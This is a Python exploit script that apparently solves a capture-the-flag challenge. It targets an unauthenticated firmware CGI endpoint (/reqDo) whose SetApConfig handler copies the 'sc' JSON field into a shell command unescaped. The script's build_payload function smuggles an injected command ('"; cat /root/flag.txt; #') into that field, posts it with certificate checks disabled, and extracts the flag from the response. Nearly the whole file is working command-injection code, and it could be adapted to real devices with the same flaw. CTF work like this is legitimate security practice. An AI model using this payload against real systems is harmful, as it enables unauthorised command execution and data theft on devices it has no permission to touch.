#!/usr/bin/env python3
"""Solve NNS CTF 2026 - Clean Sweep.

The target exposes the firmware's ``reqDo`` CGI without authentication.  Its
SetApConfig branch places the ``sc`` JSON value inside a shell command without
escaping it.  This solver uses that narrow primitive to read the flag.
"""

from __future__ import annotations

import argparse
import json
import os
import re
from pathlib import Path

import requests
import urllib3


DEFAULT_URL = "https://clean-sweep-a80a282bd7c4.chall.nnsc.tf"
TARGET_URL = os.environ.get("CLEAN_SWEEP_URL", DEFAULT_URL).rstrip("/")
ENDPOINT = "/reqDo"
ROOT = Path(__file__).resolve().parents[1]
FLAG_PATH = ROOT / "flag.txt"
FLAG_RE = re.compile(rb"\bNNS\{[^{}\r\n]+\}")


def build_payload(command: str = "cat /root/flag.txt") -> dict[str, str]:
    """Build the SetApConfig request that executes *command*.

    ``s`` and ``p`` are intentionally empty: the firmware base64-encodes
    those fields, while ``sc`` is copied into the shell command verbatim.
    """

    if not command or "\r" in command or "\n" in command:
        raise ValueError("command must be non-empty and single-line")

    return {
        "td": "SetApConfig",
        "s": "",
        "p": "",
        "sc": f'"; {command}; #',
        "sck2": "",
        "lb": "",
    }


def extract_flag(output: bytes | str) -> str:
    """Extract the single NNS flag from CGI output."""

    raw = output.encode() if isinstance(output, str) else output
    matches = sorted(set(match.decode("utf-8") for match in FLAG_RE.findall(raw)))
    if not matches:
        preview = raw[:300].decode("utf-8", "replace")
        raise RuntimeError(f"target response did not contain an NNS flag: {preview!r}")
    if len(matches) != 1:
        raise RuntimeError(f"target response contained multiple flags: {matches}")
    return matches[0]


def request_flag(session: requests.Session, base_url: str = TARGET_URL) -> bytes:
    """Send the exploit and return the raw target response."""

    response = session.post(
        f"{base_url.rstrip('/')}{ENDPOINT}",
        data=json.dumps(build_payload(), separators=(",", ":")).encode("utf-8"),
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        verify=False,
        timeout=(10, 20),
    )
    response.raise_for_status()
    return response.content


def solve(output_path: Path = FLAG_PATH) -> str:
    """Exploit the target, save the flag locally, and return it."""

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    with requests.Session() as session:
        flag = extract_flag(request_flag(session))

    output_path.write_text(flag + "\n", encoding="utf-8")
    print(f"[+] Flag: {flag}")
    print(f"[+] Saved to {output_path}")
    return flag


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output",
        type=Path,
        default=FLAG_PATH,
        help=f"local flag file (default: {FLAG_PATH})",
    )
    args = parser.parse_args()
    solve(args.output)


if __name__ == "__main__":
    main()
